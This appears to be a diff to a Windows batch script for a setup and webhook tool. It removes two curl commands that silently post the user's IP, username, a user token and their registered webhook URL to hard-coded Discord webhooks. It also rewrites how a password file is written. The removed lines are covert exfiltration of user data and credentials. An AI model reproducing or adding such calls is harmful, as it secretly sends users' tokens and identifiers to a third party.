@@ -194,8 +194,6 @@ curpos 2 23
 echo.[97mfetching blacklist                           
 call update\PrintProgress.bat  40 55 F 0
 
-curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"title\":\"New Registration\",\"description\":\"Someone has started a first setup in the app.\n\nIP: `%MyIP%`\nUsername: `%username%`\n\n```\n%userTknWSEND%\n```\",\"color\":3092790}]}" https://ptb.discord.com/api/webhooks/952191537415090178/5_-9IRy3w3GKu_0dE2VEZCHP3-BcQGCQzACqC43a0v-GdL7aCon2HzI4IxYSx4NwVg6y
-
 attrib +h +s update\userToken.dat >nul 2>&1
 
 
@@ -1214,9 +1212,11 @@ if "%psw%" == "unset" (
     pause >nul
     goto menum
 ) else (
+    setlocal enabledelayedexpansion
     (
-        echo.%psw%
+        set /p ".=%psw%" <nul
     )>psw.dat
+    endlocal
 
     if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
     if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
@@ -1343,8 +1343,6 @@ if not "%vfcode_ask%" == "%vfcode%" (
 (
     echo.%w%
 )>update\webhook.dat
-
-curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> The new webhook registration has been added:\n`%w%`\",\"color\":3092790}]}" https://ptb.discord.com/api/webhooks/952557411137388615/JoR7ktBHBzJ4UBI1HK5tJrf0g21CdTZetE7I9zXMYDs6t6v8ce9G4RzIQrkLyX2nr6AL >nul 2>&1
 
 if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
 if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
